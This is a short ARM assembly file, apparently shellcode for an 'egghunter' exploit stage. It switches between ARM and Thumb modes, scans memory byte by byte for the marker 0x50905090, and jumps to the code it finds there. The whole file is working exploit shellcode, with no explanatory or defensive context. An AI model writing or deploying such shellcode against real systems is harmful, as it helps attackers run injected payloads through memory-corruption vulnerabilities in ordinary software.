@eghunter for a high address
@find the address using the 0x50905090 egg
.section .text
.global _start
_start:
	.ARM
	ADD R3, PC, #1
	BX R3

	.THUMB
	ADR R1, pmV
	LDR R2, egg

	inc_addr:
	ADD R1, R1, #1
	LDR R3, [R1]
	CMP R2, R3
	BNE inc_addr

	//go back into ARM mode
	MOV R3, PC
	BX R3

	.ARM
	MOV PC, R1 //found

egg:
	.ascii "\x50\x90\x50\x90"
pmV:
